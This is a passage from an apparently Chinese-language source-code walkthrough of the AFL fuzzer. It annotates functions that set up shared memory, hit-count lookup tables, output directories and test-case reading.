punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>virgin_tmout<span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> MAP_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>virgin_crash<span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> MAP_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  shm_id <span class="token operator">=</span> <span class="token function">shmget</span><span class="token punctuation">(</span>IPC_PRIVATE<span class="token punctuation">,</span> MAP_SIZE<span class="token punctuation">,</span> IPC_CREAT <span class="token operator">|</span> IPC_EXCL <span class="token operator">|</span> <span class="token number">0600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 创建共享内存段，大小为 MAP_SIZE，模式为只有创建者有访问权限，将返回的共享内存标识符保存到shm_id里</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>shm_id <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"shmget() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//共享内存标识符小于0，创建失败报错</span>  <span class="token function">atexit</span><span class="token punctuation">(</span>remove_shm<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 注册退出时的回调函数，以确保在程序退出时清理共享内存</span>  shm_str <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> shm_id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//共享内存标识符数值转成字符串</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dumb_mode<span class="token punctuation">)</span> <span class="token function">setenv</span><span class="token punctuation">(</span>SHM_ENV_VAR<span class="token punctuation">,</span> shm_str<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//不是 dumb 模式就设置环境变量 SHM_ENV_VAR 为共享内存标识符数值转的字符串</span>  <span class="token function">ck_free</span><span class="token punctuation">(</span>shm_str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//释放字符串内存</span>  trace_bits <span class="token operator">=</span> <span class="token function">shmat</span><span class="token punctuation">(</span>shm_id<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将共享内存段附加到当前进程的地址空间，trace_bits 指向共享内存第一个字节的指针，此处得到内存地址为 0x7ffff7fb9000</span>  <span class="token comment">//0x7ffff7fb9000     0x7ffff7fc9000 rw-p    10000      0 /SYSV00000000 (deleted)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>trace_bits<span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">" () failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//附加失败则报错退出</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="remove-shm"><a href="#remove-shm" class="headerlink" title="remove_shm"></a>remove_shm</h3><p>对应 setup_shm 创建共享内存段，该函数用于删除共享内存段</p><blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">shmctl</span><span class="token punctuation">(</span><span class="token keyword">int</span> shmid<span class="token punctuation">,</span> <span class="token keyword">int</span> cmd<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">shmid_ds</span> <span class="token operator">*</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数</p><ul><li>shmid：共享内存段的标识符</li><li>cmd：控制命令<ul><li>IPC_RMID：删除共享内存段。当所有进程都分离后，共享内存段会被销毁</li><li>IPC_STAT：获取共享内存段的当前状态信息，并将这些信息存储到 buf 指向的 struct shmid_ds 结构体中</li><li>IPC_SET：设置共享内存段的某些属性，这些属性通常存储在 buf 指向的 struct shmid_ds 结构体中</li><li>IPC_INFO：获取关于共享内存的系统限制值信息</li><li>SHM_INFO：获取系统为共享内存消耗的资源信息</li><li>SHM_LOCK：禁止系统将共享内存段交换至 swap 分区</li><li>SHM_UNLOCK：允许系统将共享内存段交换至 swap 分区</li></ul></li><li>buf：指向 <code>struct shmid_ds</code> 结构体的指针，用于存储或获取共享内存段的属性信息</li></ul><p>返回值</p><ul><li>成功时返回 <code>0</code></li><li>失败时返回 <code>-1</code>，并设置 <code>errno</code></li></ul></blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">remove_shm</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">shmctl</span><span class="token punctuation">(</span>shm_id<span class="token punctuation">,</span> IPC_RMID<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除共享内存段，进程分离后销毁内存段</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="init-count-class16"><a href="#init-count-class16" class="headerlink" title="init_count_class16"></a>init_count_class16</h3><p>count_class_lookup8 将路径命中数进行规整，例如 4-7 次计数为 8</p><p>count_class_lookup16 因为 AFL 中对于一条分支径的表示是由一个二元组，例如 A-&gt;B-&gt;C：[A,B],[B,C],[C,D]</p><p>count_class_lookup16 初始化结果：遍历所有二元组的组合（0-255），组合成一个数值</p><ul><li>例如 [3,20] -&gt; count_class_lookup8：[4,32(0x20)] -&gt; count_class_lookup16：0x0420</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">const</span> u8 count_class_lookup8<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>           <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>           <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>           <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">4</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token number">7</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">8</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token number">15</span><span class="token punctuation">]</span>    <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">16</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token number">31</span><span class="token punctuation">]</span>   <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">32</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token number">127</span><span class="token punctuation">]</span>  <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">128</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token number">255</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">128</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> u16 count_class_lookup16<span class="token punctuation">[</span><span class="token number">65536</span><span class="token punctuation">]</span><span class="token punctuation">;</span>EXP_ST <span class="token keyword">void</span> <span class="token function">init_count_class16</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u32 b1<span class="token punctuation">,</span> b2<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>b1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> b1 <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> b1<span class="token operator">++</span><span class="token punctuation">)</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span>b2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> b2 <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> b2<span class="token operator">++</span><span class="token punctuation">)</span>      count_class_lookup16<span class="token punctuation">[</span><span class="token punctuation">(</span>b1 <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> b2<span class="token punctuation">]</span> <span class="token operator">=</span>         <span class="token punctuation">(</span>count_class_lookup8<span class="token punctuation">[</span>b1<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span>        count_class_lookup8<span class="token punctuation">[</span>b2<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="setup-dirs-fds"><a href="#setup-dirs-fds" class="headerlink" title="setup_dirs_fds"></a>setup_dirs_fds</h3><p>在工作目录创建一些文件夹，打开一些文件以获取 fd</p><ul><li>如果设置了 sync_id 就创建 sync_dir 权限 0700，失败就报错退出</li><li>创建 out_dir 文件夹权限 0700<ul><li>创建失败且文件不存在，报错创建失败</li><li>创建失败但文件存在，调用 maybe_delete_out_dir 删除 out_dir 里旧的东西</li><li>创建成功但是设置了 in_place_resume 则报错退出</li></ul></li><li>只读方式打开 out_dir 获得 out_dir_fd</li><li>没有定义宏 __sun 且 out_dir 打开失败或通过flock建立互斥锁定失败则报错退出</li><li>out_dir 目录下创建文件夹 queue、.synced（sync_id存在时）、crashes、hangs、plot_data，权限为 0700 创建失败则报错退出</li><li>queue 文件夹下创建 .state：保存用于 session resume 和 related tasks 的queue metadata，并以 0700 的权限在其中创建：<ul><li>deterministic_done：标记过去经历过deterministic fuzzing的queue entries</li><li>auto_extras：存储自动选择的字典条目</li><li>redundant_edges：存储当前被认为是冗余的路径</li><li>variable_behavior：存储显示可变行为的路径</li></ul></li><li>打开 &#x2F;dev&#x2F;null（读写）、&#x2F;dev&#x2F;urandom（只读）得到对应的 fd</li><li>打开或不存在时创建 plot_data（只写） 得到对应的 fd，获取句柄，根据句柄得到 FILE* plot_file，并向里写入 <code># unix_time, cycles_done, cur_path, paths_total, pending_total, pending_favs, map_size, unique_crashes, unique_hangs, max_depth, execs_per_sec</code></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">EXP_ST <span class="token keyword">void</span> <span class="token function">setup_dirs_fds</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u8<span class="token operator">*</span> tmp<span class="token punctuation">;</span>  s32 fd<span class="token punctuation">;</span>  <span class="token function">ACTF</span><span class="token punctuation">(</span><span class="token string">"Setting up output directories..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>sync_id <span class="token operator">&amp;&amp;</span> <span class="token function">mkdir</span><span class="token punctuation">(</span>sync_dir<span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> errno <span class="token operator">!=</span> EEXIST<span class="token punctuation">)</span>      <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to create '%s'"</span><span class="token punctuation">,</span> sync_dir<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mkdir</span><span class="token punctuation">(</span>out_dir<span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">!=</span> EEXIST<span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to create '%s'"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建失败且文件不存在，报错创建失败</span>    <span class="token function">maybe_delete_out_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建失败但文件存在，调用 maybe_delete_out_dir 删除 out_dir 里旧的东西</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>in_place_resume<span class="token punctuation">)</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Resume attempted but old output directory not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建成功但是设置了 in_place_resume 则报错退出</span>          out_dir_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>out_dir<span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//只读方式打开 out_dir 获得 out_dir_fd</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">__sun</span></span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>out_dir_fd <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token function">flock</span><span class="token punctuation">(</span>out_dir_fd<span class="token punctuation">,</span> LOCK_EX <span class="token operator">|</span> LOCK_NB<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to flock() output directory."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//没有定义宏 __sun 且 out_dir 打开失败或通过flock建立互斥锁定失败则报错退出</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* !__sun */</span></span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//创建文件夹、打开文件</span>  <span class="token comment">/* Queue directory for any starting &amp; discovered paths. */</span>  tmp <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/queue"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mkdir</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to create '%s'"</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Top-level directory for queue metadata used for session     resume and related tasks. */</span>  tmp <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/queue/.state/"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mkdir</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to create '%s'"</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Directory for flagging queue entries that went through     deterministic fuzzing in the past. */</span>  tmp <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/queue/.state/deterministic_done/"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mkdir</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to create '%s'"</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Directory with the auto-selected dictionary entries. */</span>  tmp <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/queue/.state/auto_extras/"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mkdir</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to create '%s'"</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* The set of paths currently deemed redundant. */</span>  tmp <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/queue/.state/redundant_edges/"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mkdir</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to create '%s'"</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* The set of paths showing variable behavior. */</span>  tmp <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/queue/.state/variable_behavior/"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mkdir</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to create '%s'"</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Sync directory for keeping track of cooperating fuzzers. */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>sync_id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    tmp <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/.synced/"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mkdir</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">!</span>in_place_resume <span class="token operator">||</span> errno <span class="token operator">!=</span> EEXIST<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to create '%s'"</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">/* All recorded crashes. */</span>  tmp <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/crashes"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mkdir</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to create '%s'"</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* All recorded hangs. */</span>  tmp <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/hangs"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mkdir</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to create '%s'"</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Generally useful file descriptors. */</span>  dev_null_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/null"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>dev_null_fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to open /dev/null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  dev_urandom_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>dev_urandom_fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to open /dev/urandom"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Gnuplot output file. */</span>  tmp <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/plot_data"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">)</span><span class="token punctuation">;</span>  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> O_WRONLY <span class="token operator">|</span> O_CREAT <span class="token operator">|</span> O_EXCL<span class="token punctuation">,</span> <span class="token number">0600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to create '%s'"</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  plot_file <span class="token operator">=</span> <span class="token function">fdopen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>plot_file<span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"fdopen() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span>plot_file<span class="token punctuation">,</span> <span class="token string">"# unix_time, cycles_done, cur_path, paths_total, "</span>                     <span class="token string">"pending_total, pending_favs, map_size, unique_crashes, "</span>                     <span class="token string">"unique_hangs, max_depth, execs_per_sec\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">/* ignore errors */</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read_testcases"></a>read_testcases</h3><ul><li>检查 in_dir 文件夹是否存在 queue 文件夹，存在则 in_dir &#x3D; in_dir&#x2F;queue</li><li>扫描 in_dir 将结果（包括 . ..）保存到 nl，数量保存到 nl_cnt<ul><li>扫描数量为 0 时报错打开失败，如果目录或文件不存在或路径不是目录时提示输入目录无效</li></ul></li><li>shuffle_queue 为真且扫描数量大于 1 则调用 shuffle_ptrs 重排nl里的指针的位置</li><li>循环检索扫描到的文件，获取 in_dir&#x2F;文件名 和 in_dir&#x2F;.state&#x2F;deterministic_done&#x2F;文件名 这两个字符串，并且释放对应 nl 空间</li><li>检查文件状态，异常则报错退出；检测并跳过目录、设备文件、空文件、README文件</li><li>文件大小大于 MAX_FILE 则报错退出</li><li>in_dir&#x2F;.state&#x2F;deterministic_done&#x2F;文件名 能打开则设置 passed_det &#x3D; 1，用来判断是否这个入口已经完成deterministic fuzzing，在恢复异常终止的扫描时不想重复进行deterministic fuzzing</li><li><a href="##add_to_queue">add_to_queue</a> 将测试用例加入 queue</li><li>queued_paths 为 0，提示需要一个或多个 1kb 以内的测试用例，输入目录中没有可用的测试用例</li><li>设置 last_path_time &#x3D; 0，queued_at_start &#x3D; queued_paths</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">read_testcases</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">dirent</span> <span class="token operator">*</span><span class="token operator">*</span>nl<span class="token punctuation">;</span>  s32 nl_cnt<span class="token punctuation">;</span>  u32 i<span class="token punctuation">;</span>  u8<span class="token operator">*</span> fn<span class="token punctuation">;</span>      fn <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/queue"</span><span class="token punctuation">,</span> in_dir<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> F_OK<span class="token punctuation">)</span><span class="token punctuation">)</span> in_dir <span class="token operator">=</span> fn<span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token function">ck_free</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//检查 in_dir 文件夹是否存在 queue 文件夹，存在则 in_dir = in_dir/queue</span>  <span class="token function">ACTF</span><span class="token punctuation">(</span><span class="token string">"Scanning '%s'..."</span><span class="token punctuation">,</span> in_dir<span class="token punctuation">)</span><span class="token punctuation">;</span>  nl_cnt <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span>in_dir<span class="token punctuation">,</span> <span class="token operator">&amp;</span>nl<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> alphasort<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//扫描 in_dir 将结果保存到 nl，数量保存到 nl_cnt，本例中 nl_cnt = 3（. .. testcase)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>nl_cnt <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//扫描数量为 0 </span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">==</span> ENOENT <span class="token operator">||</span> errno <span class="token operator">==</span> 